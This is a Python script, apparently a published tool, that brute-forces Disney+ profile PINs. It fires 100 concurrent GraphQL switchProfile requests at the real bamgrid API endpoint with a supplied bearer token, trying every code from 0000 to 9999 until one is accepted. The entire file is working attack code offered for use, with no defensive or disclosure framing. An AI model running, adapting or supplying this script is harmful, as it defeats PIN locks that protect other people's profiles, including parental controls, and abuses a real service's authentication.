import asyncio
import aiohttp
import argparse

class PinBruteforcer:
    def __init__(self, auth_token, profile_id):
        self.url = "https://disney.api.edge.bamgrid.com"
        self.headers = { "Authorization": f"Bearer {auth_token}", }
        self.profile_id = profile_id
        self.queue = asyncio.Queue()
        self.stop_event = asyncio.Event()
        self.correct_code = None
        self.error = False
        
    async def setup_queue(self):
        for code in range(10000):
            await self.queue.put(f"{code:04d}")
        print(f"Queue setup complete with {self.queue.qsize()} codes")
        
    async def crack_code(self, session):
        while not self.stop_event.is_set():
            try:
                current_code = await asyncio.wait_for(self.queue.get(), timeout=1.0)
            except asyncio.TimeoutError:
                self.stop_event.set()
                break
            
            if self.stop_event.is_set():
                self.queue.task_done()
                break
            
            payload = {
                "query": """
                    mutation switchProfile($input: SwitchProfileInput!) {
                        switchProfile(switchProfile: $input) {
                            account {
                                id
                                accountConsentToken
                                attributes {
                                email
                                emailVerified
                            }
                            activeProfile {
                                id
                                name
                            }
                        }
                        activeSession {
                            sessionId
                        }
                    }
                } 
                """,
                "variables": {
                    "input": {
                        "entryPin": f"{current_code}",
                        "profileId": f"{self.profile_id}",
                    }
                },
                "operationName": "switchProfile",
            }
            
            async with session.post(f"{self.url}/v1/public/graphql", json=payload, headers=self.headers) as response:
                if response.status != 200:
                    self.error = f"HTTP error {response.status}"
                    self.stop_event.set()
                    break
                
                result = await response.json()
                invalid = next((e.get("extensions", {}).get("code") for e in result.get("errors", []) if e.get("extensions")), result.get("errors", [{}])[0].get("code"))
                
                if not invalid:
                    self.correct_code = current_code
                    self.stop_event.set()
                else:
                    error_codes = {
                        "token.service.invalid.grant": "Invalid profile ID", 
                        "access-token.invalid": "Invalid access token",
                    }
                    if invalid in error_codes:
                        invalid_msg = error_codes[invalid]    
                        self.error = invalid_msg
                        self.stop_event.set()
                    else:
                        print(f"\rTried code: {current_code} but it was not valid", end="", flush=True)
        
        self.queue.task_done()

async def run_bruteforcer(bruteforcer):
    await bruteforcer.setup_queue()
    
    async with aiohttp.ClientSession() as session:
        tasks = [asyncio.create_task(bruteforcer.crack_code(session)) for i in range(100)]
        await asyncio.gather(*tasks)

    if bruteforcer.error: 
        print(f"An error occurred: {bruteforcer.error}")
        return

    if bruteforcer.correct_code:
        print(f"\nThe correct PIN code is: {bruteforcer.correct_code}")
        return
        
    print("\nBruteforce attempt completed. But no valid code was found.")
        
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Disney+ PIN Bruteforcer")
    parser.add_argument("-a", "--auth_token", required=True, help="Your Disney+ authentication token")
    parser.add_argument("-p", "--profile_id", required=True, help="The profile ID to use")
    args = parser.parse_args()

    bruteforcer = PinBruteforcer(args.auth_token, args.profile_id)
    asyncio.run(run_bruteforcer(bruteforcer))
